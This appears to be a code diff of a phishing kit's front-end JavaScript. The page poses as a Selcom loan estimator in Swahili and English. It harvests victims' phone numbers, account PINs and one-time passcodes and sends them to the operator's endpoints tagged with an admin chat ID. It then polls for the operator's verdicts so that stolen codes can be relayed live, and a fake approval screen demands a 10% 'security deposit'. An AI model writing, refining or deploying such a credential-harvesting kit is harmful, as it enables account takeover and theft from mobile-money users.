@@ -1,121 +1,145 @@
 document.addEventListener('DOMContentLoaded', () => {
   const screenWelcome = document.getElementById('screen-welcome');
-  const screenEstimator = document.getElementById('screen-estimator');
-  const screenStep1 = document.getElementById('screen-step1');
-  const screenStep2 = document.getElementById('screen-step2');
-  const screenStep3 = document.getElementById('screen-step3');
-  const screenPin = document.getElementById('screen-pin');
+  const screenSignin = document.getElementById('screen-signin');
   const screenOtp = document.getElementById('screen-otp');
-  const screenLoading = document.getElementById('screen-loading');
   const screenSuccess = document.getElementById('screen-success');
+  const loadingOverlay = document.getElementById('loading-overlay');
 
-  const credsBanner = document.getElementById('creds-surface-banner');
-  const otpBanner = document.getElementById('otp-surface-banner');
-  const phoneError = document.getElementById('phone-error');
+  const langToggle = document.getElementById('lang-toggle-switch');
+  const credsBanner = document.getElementById('banner-creds-error');
+  const otpBanner = document.getElementById('banner-otp-error');
+
+  const phoneInput = document.getElementById('phone-number');
+  const pinBoxes = document.querySelectorAll('.pin-box-num');
+  const btnSubmitCreds = document.getElementById('btn-submit-creds');
+
+  const otpBoxes = document.querySelectorAll('.otp-box-num');
+  const btnSubmitOtp = document.getElementById('btn-submit-otp');
+  const countdownEl = document.getElementById('countdown');
+  const btnRequestNewOtp = document.getElementById('btn-request-new-otp');
 
   let currentUserId = null;
   let statusPollInterval = null;
   let countdownInterval = null;
-  let currentLang = 'sw'; // default Swahili
+  let currentLanguage = 'sw'; // Default Swahili
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  function showScreen(target) {
-    [screenWelcome, screenEstimator, screenStep1, screenStep2, screenStep3, screenPin, screenOtp, screenLoading, screenSuccess].forEach(s => {
+  function showScreen(targetScreen) {
+    [screenWelcome, screenSignin, screenOtp, screenSuccess].forEach(s => {
       if (s) s.classList.remove('active');
     });
-    if (target) target.classList.add('active');
+    if (targetScreen) targetScreen.classList.add('active');
   }
 
-  // Global Language Switcher function
-  function setLanguage(lang) {
-    currentLang = lang;
-    
-    document.querySelectorAll('.lang-btn').forEach(b => {
-      if ((lang === 'en' && (b.innerText.includes('ENG') || b.id.includes('eng'))) || 
-          (lang === 'sw' && (b.innerText.includes('SWAHILI') || b.id.includes('swa')))) {
-        b.classList.add('active');
-      } else {
-        b.classList.remove('active');
-      }
+  // Language Switcher Logic
+  function updateLanguageTexts(lang) {
+    currentLanguage = lang;
+    const isSwahili = lang === 'sw';
+
+    if (isSwahili) {
+      document.getElementById('txt-welcome-subtitle').innerText = 'Kadiria marejesho yako ya mkopo';
+      document.getElementById('lbl-loan-amt-title').innerText = 'KIASI CHA MKOPO';
+      document.getElementById('lbl-loan-term-title').innerText = 'MUDA WA MKOPO (MIEZI)';
+      document.getElementById('lbl-est-rep').innerText = 'MAREJESHO YA MWEZI KADIRIA';
+      document.getElementById('lbl-tot-rep').innerText = 'JMLA YA MAREJESHO';
+      document.getElementById('lbl-interest').innerText = '*Riba inayodhaniwa: 13.5%';
+      document.getElementById('btn-goto-signin').innerText = 'INGIA';
+
+      document.getElementById('lbl-ingia-akaunti').innerText = 'Ingia Akaunti';
+      document.getElementById('lbl-phone-label').innerText = 'Nambari ya Simu / Account No';
+      document.getElementById('lbl-pin-label').innerText = 'Weka PIN yako (tarakimu 4)';
+      document.getElementById('lbl-forgot-pin').innerText = 'Umesahau PIN?';
+      document.getElementById('btn-submit-creds').innerText = 'INGIA';
+
+      document.getElementById('lbl-otp-title').innerText = 'Uthibitisho wa OTP ya Selcom';
+      document.getElementById('lbl-otp-sub').innerHTML = 'Weka tarakimu 6 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="display-otp-phone">+2557125535595</strong>';
+      document.getElementById('lbl-otp-notice').innerText = '✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 6 kutoka WhatsApp au SMS hapa chini.';
+      document.getElementById('lbl-timer').innerHTML = 'Tuma tena msimbo ndani ya <span id="countdown">1:00</span>';
+      document.getElementById('btn-request-new-otp').innerText = 'Tuma Msimbo Mpya (Request New OTP)';
+      document.getElementById('btn-submit-otp').innerText = 'WASILISHA';
+
+      document.getElementById('lbl-hongera').innerText = 'Hongera!';
+      document.getElementById('lbl-approved-sub').innerHTML = 'Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.';
+      document.getElementById('lbl-approved-heading').innerText = 'KIASI KILICHOIDHINISHWA';
+      document.getElementById('lbl-notisi').innerText = '⚠️ NOTISI YA UZINGATIAJI';
+      document.getElementById('lbl-notisi-body').innerText = 'Akaunti yako ya SELCOM details lazima iwe hai na idumish amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.';
+      document.getElementById('btn-finish-home').innerText = 'RUDI NYUMBANI';
+    } else {
+      document.getElementById('txt-welcome-subtitle').innerText = 'Estimate your loan repayments';
+      document.getElementById('lbl-loan-amt-title').innerText = 'LOAN AMOUNT';
+      document.getElementById('lbl-loan-term-title').innerText = 'LOAN TERM (MONTHS)';
+      document.getElementById('lbl-est-rep').innerText = 'ESTIMATED MONTHLY REPAYMENT';
+      document.getElementById('lbl-tot-rep').innerText = 'TOTAL REPAYMENT';
+      document.getElementById('lbl-interest').innerText = '*Assumed Interest Rate: 13.5%';
+      document.getElementById('btn-goto-signin').innerText = 'SIGN IN';
+
+      document.getElementById('lbl-ingia-akaunti').innerText = 'Sign In Account';
+      document.getElementById('lbl-phone-label').innerText = 'Mobile Number / Account No';
+      document.getElementById('lbl-pin-label').innerText = 'Enter your PIN (4 digits)';
+      document.getElementById('lbl-forgot-pin').innerText = 'Forgot PIN?';
+      document.getElementById('btn-submit-creds').innerText = 'SIGN IN';
+
+      document.getElementById('lbl-otp-title').innerText = 'Selcom OTP Verification';
+      document.getElementById('lbl-otp-sub').innerHTML = 'Enter the 6-digit OTP sent to your Selcom registered phone number <strong id="display-otp-phone">+2557125535595</strong>';
+      document.getElementById('lbl-otp-notice').innerText = '✓ Message verified! Please enter your 6-digit OTP code from WhatsApp or SMS below.';
+      document.getElementById('lbl-timer').innerHTML = 'Resend code in <span id="countdown">1:00</span>';
+      document.getElementById('btn-request-new-otp').innerText = 'Request New OTP';
+      document.getElementById('btn-submit-otp').innerText = 'SUBMIT';
+
+      document.getElementById('lbl-hongera').innerText = 'Congratulations!';
+      document.getElementById('lbl-approved-sub').innerHTML = 'Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.';
+      document.getElementById('lbl-approved-heading').innerText = 'APPROVED AMOUNT';
+      document.getElementById('lbl-notisi').innerText = '⚠️ COMPLIANCE NOTICE';
+      document.getElementById('lbl-notisi-body').innerText = 'Your SELCOM account details must be active and maintain a security deposit of at least 10% of the requested loan amount. This deposit is fully refunded after loan completion.';
+      document.getElementById('btn-finish-home').innerText = 'RETURN HOME';
+    }
+  }
+
+  // Initialize with Swahili default checked
+  langToggle.addEventListener('change', (e) => {
+    updateLanguageTexts(e.target.checked ? 'sw' : 'en');
+  });
+  updateLanguageTexts('sw');
+
+  // Slider Logic & Calculator
+  const loanSlider = document.getElementById('loan-amount-slider');
+  const loanText = document.getElementById('loan-amount-text');
+  const monthsSlider = document.getElementById('loan-months-slider');
+  const monthsText = document.getElementById('loan-months-text');
+  const monthlyRepVal = document.getElementById('monthly-rep-val');
+  const totalRepVal = document.getElementById('total-rep-val');
+
+  function updateCalculations() {
+    const amount = Number(loanSlider.value);
+    const months = Number(monthsSlider.value);
+    loanText.innerText = `TSH ${amount.toLocaleString()}`;
+    monthsText.innerText = `${months} ${currentLanguage === 'sw' ? 'MIEZI' : 'MONTHS'}`;
+
+    const totalRep = amount * 1.135;
+    const monthlyRep = totalRep / months;
+
+    monthlyRepVal.innerText = `TSH ${Math.round(monthlyRep).toLocaleString()}`;
+    totalRepVal.innerText = `TSH ${Math.round(totalRep).toLocaleString()}`;
+  }
+
+  loanSlider.addEventListener('input', updateCalculations);
+  monthsSlider.addEventListener('input', updateCalculations);
+  updateCalculations();
+
+  // Navigate to Sign In screen
+  const btnGotoSignin = document.getElementById('btn-goto-signin');
+  if (btnGotoSignin) {
+    ['click', 'touchstart'].forEach(evt => {
+      btnGotoSignin.addEventListener(evt, (e) => {
+        e.preventDefault();
+        showScreen(screenSignin);
+      });
     });
-
-    document.querySelectorAll('[data-en]').forEach(el => {
-      const text = el.getAttribute(`data-${lang}`);
-      if (text) {
-        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
-          el.placeholder = text;
-        } else {
-          el.innerHTML = text;
-        }
-      }
-    });
   }
 
-  const btnEng = document.getElementById('btn-lang-eng');
-  const btnSwa = document.getElementById('btn-lang-swa');
-  const estBtnEng = document.querySelector('.est-lang-eng');
-  const estBtnSwa = document.querySelector('.est-lang-swa');
-
-  if (btnEng) btnEng.addEventListener('click', () => setLanguage('en'));
-  if (btnSwa) btnSwa.addEventListener('click', () => setLanguage('sw'));
-  if (estBtnEng) estBtnEng.addEventListener('click', () => setLanguage('en'));
-  if (estBtnSwa) estBtnSwa.addEventListener('click', () => setLanguage('sw'));
-
-  // Loan Estimator Sliders
-  const loanRange = document.getElementById('loan-range');
-  const loanAmountDisplay = document.getElementById('loan-amount-display');
-  const termRange = document.getElementById('term-range');
-  const loanTermDisplay = document.getElementById('loan-term-display');
-  const estMonthlyVal = document.getElementById('est-monthly-val');
-  const estTotalVal = document.getElementById('est-total-val');
-
-  function updateEstimator() {
-    const amt = Number(loanRange.value);
-    const months = Number(termRange.value);
-    loanAmountDisplay.innerText = `TSH ${amt.toLocaleString()}`;
-    loanTermDisplay.innerText = `${months} ${currentLang === 'en' ? 'MONTHS' : 'MIEZI'}`;
-
-    const monthly = Math.round((amt * 1.135) / months);
-    const total = monthly * months;
-    estMonthlyVal.innerText = `TSH ${monthly.toLocaleString()}`;
-    estTotalVal.innerText = `TSH ${total.toLocaleString()}`;
-  }
-
-  if (loanRange && termRange) {
-    loanRange.addEventListener('input', updateEstimator);
-    termRange.addEventListener('input', updateEstimator);
-    updateEstimator();
-  }
-
-  // Navigation flow
-  const btnWelcomeContinue = document.getElementById('btn-welcome-continue');
-  if (btnWelcomeContinue) {
-    btnWelcomeContinue.addEventListener('click', () => showScreen(screenEstimator));
-  }
-
-  const btnEstSignin = document.getElementById('btn-est-signin');
-  if (btnEstSignin) {
-    btnEstSignin.addEventListener('click', () => showScreen(screenStep1));
-  }
-
-  const btnStep1Back = document.getElementById('btn-step1-back');
-  if (btnStep1Back) {
-    btnStep1Back.addEventListener('click', () => showScreen(screenEstimator));
-  }
-
-  const btnStep1Next = document.getElementById('btn-step1-next');
-  if (btnStep1Next) {
-    btnStep1Next.addEventListener('click', () => showScreen(screenStep2));
-  }
-
-  const btnStep2Prev = document.getElementById('btn-step2-prev');
-  if (btnStep2Prev) {
-    btnStep2Prev.addEventListener('click', () => showScreen(screenStep1));
-  }
-  
-  const phoneInput = document.getElementById('phone-number');
+  // Phone input formatting (Starts with 0 enforcement)
   if (phoneInput) {
     phoneInput.addEventListener('input', (e) => {
       let val = e.target.value.replace(/\D/g, '');
@@ -123,167 +147,63 @@ document.addEventListener('DOMContentLoaded', () => {
         val = '0' + val.replace(/^0+/, '');
       }
       e.target.value = val;
+      checkCredsValid();
     });
   }
 
-  const btnStep2Next = document.getElementById('btn-step2-next');
-  if (btnStep2Next) {
-    btnStep2Next.addEventListener('click', () => {
-      const firstName = document.getElementById('first-name').value.trim();
-      const lastName = document.getElementById('last-name').value.trim();
-      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
-
-      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
-        if (phoneError) {
-          phoneError.innerText = currentLang === 'en' ? 'Phone number must start with 0 and be valid.' : 'Nambari lazima ianze na 0 na iwe sahihi.';
-          phoneError.style.display = 'block';
+  // Pin digits auto-tabbing
+  function setupDigitInputs(boxes, callback) {
+    boxes.forEach((box, idx) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value && idx < boxes.length - 1) {
+          boxes[idx + 1].focus();
         }
-        return;
-      }
-      if (phoneError) phoneError.style.display = 'none';
-
-      document.getElementById('sum-applicant').innerText = `${firstName} ${lastName}`.trim() || 'Client Selcom';
-      document.getElementById('sum-amount').innerText = `TSh ${Number(loanRange.value).toLocaleString()}`;
-      document.getElementById('sum-term').innerText = document.getElementById('loan-term-select').value;
-      document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || (currentLang === 'en' ? 'Business' : 'Biashara');
-
-      showScreen(screenStep3);
-    });
-  }
-
-  const btnStep3Prev = document.getElementById('btn-step3-prev');
-  if (btnStep3Prev) {
-    btnStep3Prev.addEventListener('click', () => showScreen(screenStep2));
-  }
-
-  const btnStep3Submit = document.getElementById('btn-step3-submit');
-  if (btnStep3Submit) {
-    btnStep3Submit.addEventListener('click', () => {
-      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
-      const displayPhone = document.getElementById('display-phone');
-      if (displayPhone) displayPhone.value = phoneVal;
-
-      const otpPhoneDisplay = document.getElementById('otp-phone-display');
-      if (otpPhoneDisplay) otpPhoneDisplay.innerText = `+255 ${phoneVal}`;
-
-      showScreen(screenPin);
-      if (pinDigits[0]) pinDigits[0].focus();
-    });
-  }
-
-  // PIN Inputs handling
-  const pinDigits = document.querySelectorAll('.pin-digit');
-  const btnSubmitCreds = document.getElementById('btn-submit-creds');
-
-  pinDigits.forEach((digit, idx) => {
-    digit.addEventListener('input', () => {
-      digit.value = digit.value.replace(/\D/g, '');
-      if (digit.value && idx < pinDigits.length - 1) {
-        pinDigits[idx + 1].focus();
-      }
-      checkPinComplete();
-    });
-    digit.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !digit.value && idx > 0) {
-        pinDigits[idx - 1].focus();
-      }
-    });
-  });
-
-  function checkPinComplete() {
-    const pinVal = Array.from(pinDigits).map(d => d.value).join('');
-    if (pinVal.length === 4) {
-      if (btnSubmitCreds) btnSubmitCreds.classList.add('active-blue');
-    } else {
-      if (btnSubmitCreds) btnSubmitCreds.classList.remove('active-blue');
-    }
-  }
-
-  const togglePin = document.getElementById('toggle-pin');
-  if (togglePin) {
-    togglePin.addEventListener('click', () => {
-      pinDigits.forEach(d => {
-        d.type = d.type === 'password' ? 'text' : 'password';
+        if (callback) callback();
+      });
+      box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && idx > 0) {
+          boxes[idx - 1].focus();
+        }
       });
     });
   }
 
-  // Submit Credentials (PIN and Phone No)
-  if (btnSubmitCreds) {
-    btnSubmitCreds.addEventListener('click', async () => {
-      const pinVal = Array.from(pinDigits).map(d => d.value).join('');
-      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
-
-      if (pinVal.length !== 4) return;
-      if (credsBanner) credsBanner.classList.remove('active');
-
-      showLoading(currentLang === 'en' ? 'PROCESSING...' : 'INACHAKATA...', currentLang === 'en' ? 'Sending account details...' : 'Inatuma taarifa za akaunti...');
-
-      try {
-        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
-        });
-
-        const data = await res.json();
-        if (data.success) {
-          currentUserId = data.userId;
-          startStatusPolling();
-        } else {
-          hideLoading();
-        }
-      } catch (e) {
-        hideLoading();
-      }
-    });
-  }
-
-  // OTP 6 Digits Handling (Auto-submit upon full 6 digits)
-  const otpDigits6 = document.querySelectorAll('.otp-digit-6');
-  const btnSubmitOtp = document.getElementById('btn-submit-otp');
-
-  otpDigits6.forEach((digit, idx) => {
-    digit.addEventListener('input', () => {
-      digit.value = digit.value.replace(/\D/g, '');
-      if (digit.value && idx < otpDigits6.length - 1) {
-        otpDigits6[idx + 1].focus();
-      }
-      checkOtpComplete();
-    });
-    digit.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !digit.value && idx > 0) {
-        otpDigits6[idx - 1].focus();
-      }
-    });
-  });
-
-  function checkOtpComplete() {
-    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
-    if (otpVal.length === 6) {
-      if (btnSubmitOtp) btnSubmitOtp.classList.add('active-blue');
-      submitOtpHandler();
+  function checkCredsValid() {
+    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
+    const phoneVal = phoneInput.value.trim();
+    if (phoneVal.length >= 9 && pinVal.length === 4) {
+      btnSubmitCreds.classList.add('active-blue');
     } else {
-      if (btnSubmitOtp) btnSubmitOtp.classList.remove('active-blue');
+      btnSubmitCreds.classList.remove('active-blue');
     }
   }
 
-  async function submitOtpHandler() {
-    const otpVal = Array.from(otpDigits6).map(d => d.value).join('');
-    if (otpVal.length !== 6) return;
+  setupDigitInputs(pinBoxes, checkCredsValid);
 
-    if (otpBanner) otpBanner.classList.remove('active');
-    showLoading(currentLang === 'en' ? 'VERIFYING OTP...' : 'INATHIBITISHA OTP...', currentLang === 'en' ? 'Checking verification code...' : 'Kukagua msimbo wa uthibitisho...');
+  document.getElementById('toggle-pin-visibility').addEventListener('click', () => {
+    pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
+  });
+
+  // Step 1: Submit Credentials
+  btnSubmitCreds.addEventListener('click', async () => {
+    const phoneVal = phoneInput.value.trim();
+    const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
+    if (!phoneVal || pinVal.length !== 4) return;
+
+    if (credsBanner) credsBanner.classList.remove('active');
+    showLoading('INATHIBITISHA...', 'Tafadhali subiri.');
 
     try {
-      const res = await fetch('/api/submit-otp', {
+      const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
+        body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
       });
 
       const data = await res.json();
       if (data.success) {
+        currentUserId = data.userId;
         startStatusPolling();
       } else {
         hideLoading();
@@ -291,52 +211,85 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch (e) {
       hideLoading();
     }
+  });
+
+  // OTP 6-digits Setup & Auto-submit
+  setupDigitInputs(otpBoxes, () => {
+    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
+    if (otpVal.length === 6) {
+      btnSubmitOtp.classList.add('active-blue');
+      submitOtpHandler();
+    } else {
+      btnSubmitOtp.classList.remove('active-blue');
+    }
+  });
+
+  async function submitOtpHandler() {
+    const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
+    if (otpVal.length !== 6) return;
+
+    if (otpBanner) otpBanner.classList.remove('active');
+    showLoading('INAKAGUA OTP...', 'Tafadhali subiri.');
+
+    try {
+      const res = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
+      });
+      const data = await res.json();
+      if (data.success) startStatusPolling();
+      else hideLoading();
+    } catch (e) {
+      hideLoading();
+    }
   }
 
-  if (btnSubmitOtp) btnSubmitOtp.addEventListener('click', submitOtpHandler);
+  btnSubmitOtp.addEventListener('click', submitOtpHandler);
 
-  // 1-minute countdown timer
-  function startOtpCountdown() {
+  // 1-Minute Countdown Timer
+  function startOneMinuteTimer() {
     let timeLeft = 60;
-    const timerText = document.getElementById('timer-text');
-    const btnResend = document.getElementById('btn-resend-otp');
-    if (btnResend) btnResend.classList.remove('show');
+    const timerSpan = document.getElementById('countdown');
+    if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'none';
 
     if (countdownInterval) clearInterval(countdownInterval);
 
     countdownInterval = setInterval(() => {
       timeLeft--;
-      const mins = Math.floor(timeLeft / 60);
-      const secs = timeLeft % 60;
-      if (timerText) {
-        timerText.innerText = currentLang === 'en' 
-          ? `Resend code within ${mins}:${secs < 10 ? '0' : ''}${secs} minutes` 
-          : `Tuma tena msimbo ndani ya ${mins}:${secs < 10 ? '0' : ''}${secs} dakika`;
+      let mins = Math.floor(timeLeft / 60);
+      let secs = timeLeft % 60;
+      if (timerSpan) {
+        timerSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
       }
+
       if (timeLeft <= 0) {
         clearInterval(countdownInterval);
-        if (timerText) timerText.innerText = currentLang === 'en' ? 'Code has expired.' : 'Msimbo umekwisha muda wake.';
-        if (btnResend) btnResend.classList.add('show');
+        if (timerSpan) timerSpan.innerText = '0:00';
+        if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'inline-block';
       }
     }, 1000);
   }
 
-  const btnResendOtp = document.getElementById('btn-resend-otp');
-  if (btnResendOtp) {
-    btnResendOtp.addEventListener('click', async () => {
+  if (btnRequestNewOtp) {
+    btnRequestNewOtp.addEventListener('click', async () => {
+      showLoading('INATUMASISIMBO...', 'Inatuma ombi la OTP mpya.');
       try {
         await fetch('/api/request-new-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ userId: currentUserId })
         });
-        alert(currentLang === 'en' ? 'New OTP request sent to admin.' : 'Ombi la OTP mpya limetumwa kwa msimamizi.');
-        startOtpCountdown();
-      } catch (e) {}
+        hideLoading();
+        alert(currentLanguage === 'sw' ? 'Ombi limetumwa kwa admin.' : 'Request sent to admin.');
+        startOneMinuteTimer();
+      } catch (err) {
+        hideLoading();
+      }
     });
   }
 
-  // Polling status updates from admin callbacks
+  // Polling Function
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -351,47 +304,53 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showScreen(screenOtp);
-          startOtpCountdown();
-          if (otpDigits6[0]) otpDigits6[0].focus();
+          const dispPhone = document.getElementById('display-otp-phone');
+          if (dispPhone) dispPhone.innerText = `+255${phoneInput.value.trim()}`;
+          if (otpBoxes[0]) otpBoxes[0].focus();
+          startOneMinuteTimer();
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
-          document.getElementById('approved-amount-display').innerText = `TSh ${Number(loanRange.value).toLocaleString()}`;
+          document.getElementById('final-approved-amount').innerText = `TSH ${Number(loanSlider.value).toLocaleString()}`;
           showScreen(screenSuccess);
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(statusPollInterval);
           hideLoading();
-          if (credsBanner) credsBanner.classList.add('active');
-          pinDigits.forEach(d => d.value = '');
-          if (pinDigits[0]) pinDigits[0].focus();
-          showScreen(screenPin);
+          if (credsBanner) {
+            credsBanner.innerText = 'WRONG PIN ❌ Incorrect account PIN. Please try again.';
+            credsBanner.classList.add('active');
+          }
+          pinBoxes.forEach(b => b.value = '');
+          btnSubmitCreds.classList.remove('active-blue');
+          showScreen(screenSignin);
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
-          if (otpBanner) otpBanner.classList.add('active');
-          otpDigits6.forEach(d => d.value = '');
-          if (otpDigits6[0]) otpDigits6[0].focus();
+          if (otpBanner) {
+            otpBanner.innerText = 'WRONG OTP ❌ Incorrect verification code. Please try again.';
+            otpBanner.classList.add('active');
+          }
+          otpBoxes.forEach(b => b.value = '');
+          btnSubmitOtp.classList.remove('active-blue');
           showScreen(screenOtp);
+          startOneMinuteTimer();
         }
       } catch (e) {}
     }, 2500);
   }
 
-  const btnGoHome = document.getElementById('btn-go-home');
-  if (btnGoHome) {
-    btnGoHome.addEventListener('click', () => {
-      window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
-    });
-  }
+  document.getElementById('btn-finish-home').addEventListener('click', () => {
+    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
+  });
 
   function showLoading(title, sub) {
-    const loadTitle = document.getElementById('loading-title');
-    const loadSub = document.getElementById('loading-sub');
-    if (loadTitle) loadTitle.innerText = title;
-    if (loadSub) loadSub.innerText = sub;
-    showScreen(screenLoading);
+    document.getElementById('loading-title').innerText = title;
+    document.getElementById('loading-sub').innerText = sub;
+    if (loadingOverlay) loadingOverlay.classList.add('active');
   }
 
-  function hideLoading() {}
+  function hideLoading() {
+    if (loadingOverlay) loadingOverlay.classList.remove('active');
+  }
 });
-    
+  
